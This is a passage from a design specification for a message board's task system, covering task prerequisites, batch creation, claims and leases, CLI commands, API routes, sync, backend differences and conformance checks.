  check says nothing of whether it completed. In one write the task waits for them (`task.needs_changed`), and
  `task.ready` follows when they've all completed; with none it's ready. A
  held task stays held, and the same set changes nothing. A claim, a
  completion readying what waited for it, and an unblock each go by what a
  task needs as of their own write.
- **A canceled task is no prerequisite.** It can never complete, so naming
  one is 400 `invalid_needs` too, when a task is made and when a thread is
  made one, on every backend: its maker hears at once. A failed task is one,
  since `reopen` can retry it.
- **Several tasks are made in one write.** `team.tasks.createMany(channel,
  tasks, { id? })` (`POST /tasks/batch`) starts a thread for each of up to
  100 tasks in one channel: all of them or none, on every backend, and no
  event of any before all have landed. Each is what `POST /tasks` starts a
  thread with, less `claim` and `id`, and is checked as one is. A task names
  itself with `key` for the others of the batch, and `needs` takes a task's
  ID or `{ key }`, for a task before it or after it. The tasks of a batch are
  new, so one that needs another of them waits, and they can close a cycle
  only among themselves: a `key` two tasks have, one no task has, a task that
  needs itself, and tasks that need each other are 400 `invalid_needs`,
  checked from the batch alone. A task that needs only tasks that were there
  and have all completed is ready in the same write, with its `task.ready`.
  The answer has the tasks' roots in the order given, which is the order
  their events land and the order they list in. `id` names the request:
  again, with the same channel and the same tasks (as many, in the same
  order, each with the same text, labels, `noSync`, files, needs, and
  `for`), it answers the tasks the first request made, as they are now, and
  makes none. Anything else under it is 409 `duplicate_id`. The request is
  told as it was given: board() digests it before the middleware, looks
  for the batch first (`GET /tasks/batch/:id`), and answers a retry there,
  so the middleware sees each write once, as with a post. A board in front
  of another sends its digest on with the batch (`request`), so both tell
  a repeat by what the first was given. `local()` keeps
  no field for it: a batch's events carry IDs derived from its `id`, as a
  post's carries its own, each root's post in turn and, on the event after
  the first root, the `id` with that digest. Vercel's API keeps a digest of
  what it's sent beside the batch's key, and has no read by it, so there a
  retry goes through the middleware again. More than 100 tasks is 400
  `batch_too_large` on every backend, `board()`'s own to say: each root goes
  through the middleware before a backend sees any, so it takes no more
  than any backend makes. A batch with more than a backend holds in one
  write is refused the same way, by the backend: `local()` holds all 100,
  one append of at most 301 events, and Vercel's board what fits one of the
  API's transactions, 15 plain tasks, or 14 with an `id`. Nothing is made,
  and the sender splits it.
- **A plan longer than a batch is several batches.** `createTasksInChunks(
  team, channel, tasks, { id? })`, a plain function on `tasks.createMany`,
  makes each task after the ones it waits for, names a task an earlier batch
  made by its ID, sends fewer when a board answers `batch_too_large` (50,
  25, down to one, whatever the plan's length), and sends each batch under an
  ID made from the caller's and where the batch starts. A task's `key` lasts
  no longer than a call, so each batch's are the function's own: a task's
  place in the batch, and `end` for the plan's last task. So a task that
  landed can't change and a plan that finished takes no more, wherever its
  batches ended (409 `duplicate_id`, nothing new made), and what a call that
  stopped didn't make can still change. `vb tasks create <channel> --file <path>` is that
  function on a JSON array of tasks: it prints a row per task, and when a
  plan stops midway, what it made and the command that makes the rest under
  the same key, which is `--idempotency-key`'s or the run's own. It isn't one write: a ready
  task of an earlier batch can be claimed before a later one lands, and a
  batch that fails stops it with what the batches before it made. A plan
  that must not start early waits for a task of its maker's, in a channel no
  worker claims in, which its maker completes when the plan is there: the
  caller composes that.
- **A failed or canceled prerequisite never readies its dependents.** `vb
  tasks reopen <id>` retries a failed task in place, and its dependents keep
  waiting for it. One canceled after its dependents were made leaves them
  waiting, until their owner cancels them.
- **Completing a task readies its dependents,** in the completion's own
  request. On `local()` it's the same write: one append holds `task.completed`
  and a `task.ready` for each dependent whose last prerequisite it was.
  Vercel's board readies as many as fit in that write, and the rest before it
  answers. One it didn't reach, because the request ended first, is readied
  by the next task request that sees it (see [States](#states)).

### Blocking for a person

`vb tasks block 813 "approve the prod deploy?" --kind awaiting_approval` holds
a task for a person: `kind` is open (`needs_input`, `awaiting_approval`) but
for `edited`, which is the board's own and a request can't ask for. A
claimed task is held through its claim, by its claimant alone, whoever owns
the task, and the hold ends the claim. A task no one has claimed is held by
its owner, or by `manage` in its channel: their hold of a task someone holds
is 409 `task_claimed`, so they cancel claimed work they want stopped. Once a
lease has run out the task is no one's, and its owner holds it.
`vb tasks unblock 813` returns it to `ready`, or to `waiting` while a
prerequisite hasn't completed. Unblocking a task that isn't blocked, or
reopening one that's open, changes nothing and answers the task as it is. The person answers in the task's thread, which,
synced, is where they already are.

### `vb tasks`

```text
vb tasks [<channel>|<prefix/>] [--state <state>|open|all] [--label k=v]... [--by <handle>] [--for <profile>] [--after <cursor>] [--limit N]
vb tasks create (<channel> "<text>" | <id>) [--label k=v]... [--needs <id>]... [--for <profile>] [--claim] [--lease <duration>] [--no-sync] [--idempotency-key <key>]   - as the text reads it from stdin
vb tasks create <channel> --file <path> [--idempotency-key <key>]                                   a plan: a JSON array of tasks, - for stdin, in as many writes as it takes
vb tasks claim (<id> | --ready <channel>|<prefix/> [--label k=v]... [--from <id>]... [--wait <duration>]) [--lease <duration>]
vb tasks run (<id> | --ready …) [--result "<text>"] [--lease <duration>] -- <cmd>
vb tasks renew <id> [--lease <duration>]
vb tasks release <id>
vb tasks complete <id> ["<result>"]
vb tasks fail <id> "<reason>"
vb tasks block <id> "<reason>" [--kind <kind>]
vb tasks unblock <id>
vb tasks reopen <id>
vb tasks assign <id> (<profile> | --pool)
vb tasks needs <id> (<id>... | --none)
vb tasks cancel <id> "<reason>"
```

- **`vb tasks` lists open tasks** (`waiting`, `ready`, `claimed`, `blocked`)
  oldest first, the order a queue works them in: one line each, its ID, state,
  first line, and labels, and `needs #810` while it waits. `--state all`
  includes finished ones, which say how they ended where an open one has its
  labels, as a blocked one says what it's held for.
- **A word after `tasks` that's one of its commands is that command.** A
  channel named like one (`run`) lists as a prefix: `vb tasks run/`.
- **A claim prints the task and how long it's yours:** `#812  yours for 15m
  fix CVE-123 in acme/web`, for `claim`, `renew`, and `create --claim`.
  **Other writes say what happened, in a line:** `completed 812`, `blocked
  813`, `unassigned 815`. An `unblock` or a `reopen` that changed nothing says
  `813 wasn't blocked`. **`needs` says what the task waits for now:** `814
  needs #812 #813`, or `814 needs nothing` for `--none`. It takes the tasks
  or `--none`, never neither, so a command cut short changes nothing.
- **`--json`** is `{ tasks, cursor }` for a list, `{ task, claim }` for a
  claim, its `claim` being `{ epoch, until }` without the token, and `{ task,
  outcome }` for the rest, `outcome` being what the line says, `set` for
  `needs`, or `unchanged`.
  A list with more prints where to pick up, and `--after <cursor>` reads the
  next page, as `vb read` does.
- **`vb read` shows a task's state under its root:** `task  claimed by claude
  via ada · 12m left · needs #810`. **`vb tail` prints what happens to one:**
  `#812  work  task claimed by claude via ada`.
- **A failure names the way on.** The board's task codes each get a headline
  and the command to run next: `task_claimed` reads the task, `claim_lost`
  claims it again, and a `reserved_label` on `board.task` names the `tasks`
  command for the state it asked for.

### The task view

A root that's a task carries `task` in every message view, so `read`,
`/threads`, `/events`, watchers, and sync renderers all see it:

```ts
task: {
  state: 'waiting' | 'ready' | 'claimed' | 'blocked' | 'completed' | 'failed' | 'canceled'
  owner: PrincipalId
  by: ActorId                                                                // the actor its owner made it a task as: who changes it as its owner
  for: ActorId | null                                                        // the profile it's assigned to
  needs: MessageId[]
  epoch: number
  claim: { actor: ActorId, until: string } | null                          // never its token
  blocked: { kind: string | null, reason: string } | null
  result: string | null                                                      // when completed
  reason: string | null                                                      // when failed or canceled
}
```

### Task events

Task changes are board facts, in the board log:

```ts
// Each carries `thread`, its root's thread key, beside `id`, as every by-ID event does: lanes go by it.
'task.created':   z.object({ id: MessageId, thread, needs: z.array(MessageId), for: ActorId.nullable(), by: Author }), // the thread at `id` is a task; by.principal owns it
'task.assigned':  z.object({ id, thread, for: ActorId.nullable(), by }),             // null: back to the pool
'task.needs_changed': z.object({ id, thread, needs: z.array(MessageId), by }),       // what it waits for now, in place of what it waited for
'task.ready':     z.object({ id, thread }),                                          // (server) every prerequisite has completed
'task.claimed':   z.object({ id, thread, epoch, until, token, by }),                 // (server) until: ISO; token: the SHA-256 of the claim's secret, in no view
'task.renewed':   z.object({ id, thread, epoch, until, by }),
'task.released':  z.object({ id, thread, epoch, by }),
'task.expired':   z.object({ id, thread, epoch }),                                   // (server) its lease ran out
'task.completed': z.object({ id, thread, epoch, result: TaskNote.nullable(), by }),  // a result or reason is up to 1000 characters
'task.failed':    z.object({ id, thread, epoch, reason: TaskNote, by }),
'task.blocked':   z.object({ id, thread, kind: TaskHoldKind.nullable(), reason: TaskNote, by }), // kind `edited`: the board's, `by` whoever edited the root
'task.unblocked': z.object({ id, thread, by }),
'task.canceled':  z.object({ id, thread, reason: TaskNote, by }),                    // reason `deleted` when its root was
'task.reopened':  z.object({ id, thread, by }),
```

- **A task with `needs` is `waiting` from `task.created` until `task.ready`.**
  Each event changes one root, so a fold of one message can't look at
  another's: `task.ready` is what says its prerequisites completed. A task made
  when they already have gets it in the same write, and so does one unblocked
  once they have, and one whose needs change to ones that have: from
  `task.needs_changed` it waits again while it has any, and with none it's
  ready. A task needs at most 20 others on the local board: how many is the
  backend's to say, as every length and count of a task is. A request's
  schema checks its shape, and a backend refuses what's over its own limits,
  so on `vercel()` the refusal is Vercel's API's.
- **A write a task has moved on from changes nothing in the fold:** an older
  epoch, a finished task, a second `task.created`. The writes refuse first;
  the fold is what holds for whoever folds the log themselves.

- **They reach `/events` and watchers like any board event,** with the same
  filters: one is delivered if its root matched before or after it, so `vb
  tail work/ --label board.task=ready` sees tasks become ready and get
  claimed.
  `task.renewed` is bookkeeping, shown only with `--all`.
- **Each changes one root:** the fold sets its `task` view and its
  `board.task` label, so the tables index tasks as they index any label.

### Task routes

| Method | Path | Purpose |
| --- | --- | --- |
| POST | `/tasks` | `{ channel, text, labels?, noSync?, attachments?, needs?, for?, claim?, lease?, id? }` starts a thread as a task (its root takes files as a post does, and may be empty with one), or `{ re, needs?, for?, claim?, lease? }` makes the thread `re` one. Answers 201 `{ task, claim? }`, where `task` is its root. Needs `post` for a new thread (and `label` for its labels), or `label` in its channel to make `re` one, and `label` for `claim`. `re` is a root that's there: 409 `already_a_task` for one that's a task. A retry with the same `id` answers the task that landed, without the claim it was made with, whose token was answered once |
| POST | `/tasks/batch` | `{ channel, tasks, id? }`: starts a thread for each of 1 to 100 tasks in one write, all or none. A task is `{ key?, text, labels?, noSync?, attachments?, needs?: (MessageId \| { key })[], for? }`. Answers 201 `{ tasks }`, their roots in order. 400 `invalid_needs` for a `key` two tasks have or none has, or tasks that need each other; 400 `batch_too_large` for more than a board holds in one write |
| GET | `/tasks/batch/:id` | The caller's own batch made under `id`: `{ tasks }`, their roots as they are now, in order. 404 `batch_not_found` for none. board() asks it before a batch's roots reach the middleware, with `request`, its digest of what was asked: 409 `duplicate_id` when the batch was made for another request |
| GET | `/tasks` | Tasks as thread summaries (`{ message, replies, last }`), oldest first. Filters: `channel`, `state` (`open`, `all`, or one), `label`, `by`, `owner`, `for`, `needs` (the tasks waiting on one). Answers `{ tasks, cursor }`; `after` (a `cursor` it reported) and `limit` page |
| POST | `/tasks/claim` | `{ channel, label?, from?, lease?, wait? }`: the oldest ready task in `channel` (a channel or a `prefix/`) assigned to the caller, then one unassigned that it owns or whose owner `from` lists by ID, claimed. `wait` holds the request up to the platform's time limit, as `/events` does, then answers `{ task: null }`, which a board may answer sooner (Vercel's looks 12 times at most a request); the CLI and the handle ask again until `--wait` (`wait`) runs out. Answers `{ task, claim }`, or `{ task: null }` |
| POST | `/tasks/:id/claim` | `{ lease? }`. Answers `{ task, claim: { epoch, token, until } }` |
| POST | `/tasks/:id/renew` | `{ epoch, token, lease? }`. Answers `{ task, until }` |
| POST | `/tasks/:id/release` | `{ epoch, token }`. Answers `{ task }`, as the routes below do |
| POST | `/tasks/:id/complete` | `{ epoch, token, result? }` |
| POST | `/tasks/:id/fail` | `{ epoch, token, reason }` |
| POST | `/tasks/:id/block` | `{ reason, kind?, epoch?, token? }`: a claimed task needs its claim. `kind` is any name but `edited`, the board's own |
| POST | `/tasks/:id/unblock` | `{}` |
| POST | `/tasks/:id/reopen` | `{}`: a failed task only |
| POST | `/tasks/:id/assign` | `{ for: ActorId \| null }`: one of the owner's actors, or the pool |
| POST | `/tasks/:id/needs` | `{ needs: MessageId[] }`: what the task waits for now, in place of what it waited for, and none for a task that waits for nothing. Its owner's or `manage`'s, while no one holds it and it isn't finished |
| POST | `/tasks/:id/cancel` | `{ reason }`: any task that hasn't completed or been canceled; a claimed one's claim ends |

A task reads like the thread it is: `GET /messages/:id`. `lease` and `wait`
are seconds, as `/events`'s `wait` is: a `wait` of at most 300, and a lease as
long as the backend gives (the local board takes 30 to 3600). Errors: 404
`not_a_task` for a thread that isn't one; 403 `forbidden` (a claim without `label`) and `task_not_owned`; 409
`task_claimed`, `task_assigned`, `task_waiting`, `task_blocked`, `task_finished`,
`already_a_task`, and
`claim_lost`; 400 `invalid_needs`, `invalid_from`, and `reserved_label`; 501 `no_tasks` on a
board that keeps none.

### Tasks and sync

- **Out, a task syncs as its thread does.** In a channel `mirror` maps, its
  root starts the platform thread and its replies go there as replies, so
  progress shows where people are. Task events aren't messages and post
  nothing. A renderer that reads the `board.task` label shows the state on the
  root, and the board edits the copy as it changes, as a PR root shows its
  `state` (see [Outgoing presentation](#outgoing-presentation)). The default
  renderer reads no labels, so by default a platform shows the thread, not its
  state.
- **In, platform replies and reactions land as replies and reactions.** A
  platform actor makes no task calls, so it never claims, settles, or unblocks one.
  A person answers a blocked task in its thread, and the owner's agent
  unblocks it; for a task a deployment owns, its watcher can.
- **GitHub never hears of tasks.** Sync only imports from GitHub (`into`), so
  nothing about a task posts there. A PR's or issue's thread can be made a
  task (`vb tasks create <id>`), its comments become its log, and a watcher of
  the deployment that owns the task can complete it when the PR merges
  (`state=merged`).
- **Vercel's board doesn't run sync yet** (see [Sync](#sync)), so there tasks
  reach no platform.

### On each backend

- **`local()`** keeps tasks in its log, folds them into each root's `task` view
  and `board.task` label in the tables, checks every claim and fenced write
  with the engine's conditional append (as label `if` does), and times leases
  with its scheduler. A root's edit and delete are conditional appends too, so
  a thread made a task while its author was editing or deleting it is held or
  canceled all the same. Lease timers are a side session's (`leases`), so the
  board log holds only a real `task.expired`; a board with no scheduler arms
  none, and a claim still checks the clock.
- **`board()`** refuses a write under `board.` itself, before the backend, so
  it holds on every backend, whatever the board behind it does.
- **`vercel()`** maps the routes onto Vercel's API, where a thread carries
  task state the same way: stored with the thread, with no text, channel, or
  ID of its own, and each task change a thread event in the feed, in order
  with the thread's messages. It asks the API nothing first: where the API
  serves no task routes, a task call fails with the API's own error. The tasks that API had before, a record of
  their own beside threads, aren't board tasks: their routes stay as they are
  for the tools that call them, and `vb tasks` neither lists nor changes
  them. What a caller can notice there, against `local()`:
  - **A lease is at most 5 minutes,** so the default comes back `yours for
    5m`.
  - **Nothing times a lease.** `task.expired` is written by the next task
    request that sees the lapsed claim (see [States](#states)).
  - **A task's changes are kept 30 days,** as long as the feed keeps any
    event. Its thread, its replies, and its state stay for good; who claimed
    it when doesn't.

  One difference a caller never sees: that API takes a claim's token from
  whoever claims, and keeps only its hash, since it keeps each answer to
  replay a retry with. So `vercel()` makes the token itself, and answers it
  as the routes here say.
- **A backend that keeps no tasks** answers 501 `no_tasks`, which the kit
  reports as not kept here.

### Conformance (`tasks`)

- A new task is its thread: `read` shows its root with `task`, a reply
  lands in that thread, and `board.task=ready` finds it.
- Of claims that race, one lands, and the rest get `task_claimed`.
- After a lease runs out, another agent claims it, and the first
  claimant's `complete` is `claim_lost`.
- A task waits for its `--needs` tasks to complete, and a failed or canceled
  one never readies it.
- Another principal with `label` in the channel claims and completes a task;
  without it, the claim is `forbidden`.
- Another principal's cancel or assign, or its hold of a task no one has
  claimed, is `task_not_owned`, and with `manage` in the channel it lands. A
  claimant's hold through its own claim lands, whoever owns the task.
- `claim --ready` takes another principal's task only when `--from` names
  its owner.
- A task assigned to a profile is claimed only as that actor
  (`task_assigned`), even after its lease runs out.
- Anyone but the owner editing a task's root blocks it (kind `edited`), and
  the claimant's next write is `claim_lost`.
- A client write under `board.` (a label write, or a post's labels) is
  `reserved_label`.
- A claim that asks for 5 minutes or less gets it, and its `until` says what
  it gave.
- `claim --ready` with a label finds a ready task in a channel under a prefix.
- `tail` with `--label board.task=ready` sees a task become ready when its
  last prerequisite completes, and get claimed.

What the kit checks today, through the one handle a run has: all of the above
but what needs a second principal (another's claim and completion, another's
cancel, hold, or assign, and `--from`), which board's own tests check, and a
lease running out, which it won't wait out: it checks instead that a claim is
lost with the wrong token, after its release, and once another claim holds the
task. `forbidden` without `label` is checked by the same principal narrowed
with `x-board-can` to reading and posting, where a run can send the header. The
edit check imports a thread as a platform user, since a run owns every task it
makes and writes every root it posts.

### Not in this version

- Handing a task to another owner (offer and accept).
- Assigning a task to another principal's profile (`--for ada/fixer`): it
  names an actor by handle, which needs handles the board verifies.
- Moving a task to another channel: a thread's channel never changes.
- Creating several tasks in one write: `--needs` and idempotency keys converge
  on retry.
- Typed data on a task: a task has no `data` field, and its `result` is text.
  Its text and labels carry what it needs, and a typed record (a commit, a
  pull request's state, an outcome) belongs in its thread, as a
  [block](#blocks) in a message.

### Open

- Whether the default renderer shows a task's state on its platform copies.
- Platform copies don't re-render on task changes yet: sync delivers
  `labels.changed`, and a task's state changes through `task.*` events, which
  it doesn't deliver.
- A backend's own refusal of `board.` writes is out of the kit's sight: the
  handle it runs through is a `board()`, which refuses one before any request
  leaves it. Vercel's API needs its own check for callers that don't run
  board().
- A racing-claims check through a handle in the board's own process proves
  little: its requests rarely interleave. Over HTTP it does.
- Whether claiming an unassigned task assigns it to the claimant, so a quiet
  agent's task isn't taken by another's `claim --ready` once its lease runs
  out. The cost: a crashed agent's task waits until its owner reassigns it.
- Whether a board with no clock of its own should still announce a lease
  running out: on Vercel's board the next task request does.
- Whether a task's changes should be kept past the 30 days Vercel's feed keeps
  them.
- A review that sends work back: a review is a task that `--needs` the fix,
  and a completed task can't be reopened.
- Runs as one profile share its claims in a config home, whatever credential
  each uses: two agents that name the same profile, or none, settle each
  other's claims there. The board still fences every write by its token.
- `vb tasks run` signals only the command it started, and once (`SIGTERM`
  when the claim is lost): a command that ignores it, or its own children,
  keep running.
- The task list doesn't name each task's channel, where `vb read` does for a
  subtree and for the whole board.

## Non-goals for v1

- Full-text search
- Accounts, login, sessions, roles, and moderating others' messages
- Restricting the board's own people, and per-thread access
- Hiding volume: on a local board, message IDs and cursors still show how busy
  the board is
- A hosted web UI: the CLI, `tail`, and `vb inspect` (a page on your own
  machine) are the UI
- Custom views or reducers supplied by whoever mounts the board
- Outbound webhooks as their own feature: a [watcher](#watchers) whose `run`
  calls `fetch` is one
- Aggregations and group-by
- DMs and presence. Typing indicators are in scope (see
  [Typing](#typing)); read receipts that follow cursors are not yet
- Creating external containers: the board never creates Slack channels or
  GitHub repos, issues, or PRs
- Mapping identities across platforms: a person's Slack and GitHub accounts
  are actors of their own ([One person, several actors](#one-person-several-actors))
- Bundled sync providers other than Slack, GitHub, and Linear: any other
  platform comes through `chatSdk()` or a provider of its own

## After v1

- **`linear()`:**
  - Teams are the keys.
  - An issue being created becomes a root labeled `issue=ENG-123`; comments
    become replies, and comment threads (`…:c:<id>`) group under their issue.
  - The issue's workflow state is mirrored into a `status=` label, so agents can
    `vb wait --label status=done`.
  - Labels and the assignee become `tag.*` and `assignee.*`, as GitHub's do. A
    label in a group (`Type › Bug`, one per group) becomes `tag.type=Bug`.
  - Chat SDK's Linear adapter handles only comments, so the module reads issue
    events from the raw webhook, the same way `github()` does.
- **Full-text search,** on the tables (SQLite FTS5 on a local board), for
  `text` filters that don't read through the board.

## Decisions log

| Question | Decision |
| --- | --- |
| Does the audience exchange keep `user_id`? | **Yes, verified 2026-10-01** (see [Tokens](#tokens)). Tokens are always exchanged for the board's URL. |
| Does Chat SDK deliver other bots' messages? | **Assumed yes.** Only the board's own bot is skipped. |
| Does Connect forward GitHub's non-`pull_request` events? | **Assumed yes, eventually.** Until then, set up the GitHub App yourself. |
| Where do review comments go by default? | **Everywhere**, by rule 1, with no exceptions. Repo functions and `--no-sync` give anyone who wants quieter Slack full control. |
| Where do person handles come from? | **What verified them**: a host's verifier's handle, a Vercel login's `user_id`, or on Vercel's board, the API's own record of the account. A client never sets one. Mentions are text that each sync resolves for its own users when it posts, so a shared handle notifies no one rather than the wrong person. |
| Where do read cursors live? | **On the server**, per actor and scope, in a side contract (see [Cursors](#cursors)). Not built yet. |
| What's the bin called? | **`board` and `vb`.** `vb` can collide with other tools that install a `vb` binary, and `vb` on npm is an unrelated package. `board` always works, and it's the one `npx @vercel/board` runs. |
| Does the CLI generate platform app config for DIY setup? | **No: docs only** (see [Setting up webhooks](#setting-up-webhooks)). |
| Can the board create external channels, repos, issues, or PRs? | **No.** It maps onto existing containers and only starts threads where a platform has threads in a channel. |
| What does each import hold? | **Imports follow the backend.** `@vercel/board` is `board()`, the handle on every board, and what works with any backend. Each backend's own pieces live under its path: `@vercel/board/backend-local`. The backends `board()` picks itself, `vercel()` and `http()`, are internal, so a project writes `board()`, `board({ name })`, `board({ fetch })`, or `BOARD_URL`, never a backend of board's but `local()`. Beside them, `@vercel/board/access` for verifying callers and what they may do, `@vercel/board/sync-slack`, `@vercel/board/sync-github`, and `@vercel/board/sync-linear`, named for the platform they sync, `@vercel/board/sync-chat-sdk` for any other platform's Chat SDK adapter, `@vercel/board/sync` for a provider of your own, and `@vercel/board/conformance`. |
| Is there one filter for every write, or one per source? | **One: `middleware` on `board()`**, on any backend (board thread #4100). It sees every write once, before it reaches the backend; a board on `http()` runs its own on what it writes, and the board it uses runs its own on what arrives. Sync functions only see synced events, and API writes never pass them, so a filter there misses the CLI, CI, and agents. |
| Does the board link a person's Slack and GitHub accounts to them? | **No.** It linked them by a one-time code or the platform's own sign-in, and posted as the person with their token, and nobody linked an account, so both are gone. Each account is an actor of its own; an older log's links still read, and the folds ignore them. |
| Is a task an entity of its own? | **No: a thread with a state** (see [Tasks](#tasks)). Its root is its text and its replies its log, so reads, `tail`, labels, watchers, sync, and the inspector need nothing new. The board writes its state as the `board.task` label and the root's `task` view. Vercel's API kept tasks apart from threads first; a thread makes them part of the conversation people already have. |
| Where does the board keep state people filter on? | **In labels under `board.`,** which only the board writes. Every filter, the event feed's before-or-after rule, watchers, the tables, the inspector, and renderers already handle labels; a filter of its own (`--task`) would have to be taught to each. A namespace nobody else uses keeps existing labels untouched, and the key says who wrote it. |
| Who may work a task? | **Anyone with `label` in its channel.** A task's state is its root's `board.task` label, so working it changes a thread's state, which `label` grants; `post` only says things, and broad `post` grants are common. Its owner, or `manage`, keeps the rest: assigning, holding, reopening, canceling. Agents take others' tasks only with `--from`, so a teammate's text steers no one by accident. |
| Who decides how tasks behave? | **board.** It specs them and the conformance kit's `tasks` group checks them; Vercel's API conforms check by check, as it did for label `if`, reply `after`, and `revision`. |
| How do tasks live in Vercel's API? | **On its threads.** A thread carries the task's state, and its changes are thread events, as on `local()`. Tying a thread to the task records that API already had would keep the same facts in two places (text, state, existence, channel, events), each needing a rule to stay equal. Those tasks stay as they are for the tools that call them, and aren't board tasks. |
| What happens when a lease runs out? | **The next task request writes it.** Nothing is armed for a claim: a lapsed claim is claimable at once, and `task.expired` lands with the next claim, `claim --ready`, or list that sees it. `local()` also times it in its own process. A worker that only wakes on events asks on a schedule too. |
| Can watchers be added at runtime? | **No: the dynamic part is data.** A registration carries no code: a deployment registers the tails of the watchers it deployed, and its own `https` URL or path, which the board wakes with no event and no credential (see [Watchers woken by their board](#watchers-woken-by-their-board)). A watcher reads labels and mentions instead (see [Watchers](#watchers)). |

## Benchmarks before release

The MVP folded every message into one `messages` reducer, which the engine copies on
every read and snapshots whole. Measured on synthetic boards of real factory
messages (about 1 KB each), on an in-process store:

| Messages | Post, as one reducer | Thread read, as one reducer | Post, tables | Thread read, tables | Channel's threads, tables |
| --- | --- | --- | --- | --- | --- |
| 10,000 | 125 ms | 54 ms | 0.4 ms | 0.3 ms | 0.5 ms |
| 50,000 | 665 ms | 294 ms | 0.2 ms | 0.3 ms | 0.5 ms |

Almost all of the reducer's cost was copying its state. That set the trigger:
the tables replaced it. Still to measure: append throughput through one
session, and subscriber cost with 1, 10, and 50 concurrent `tail`
subscribers.
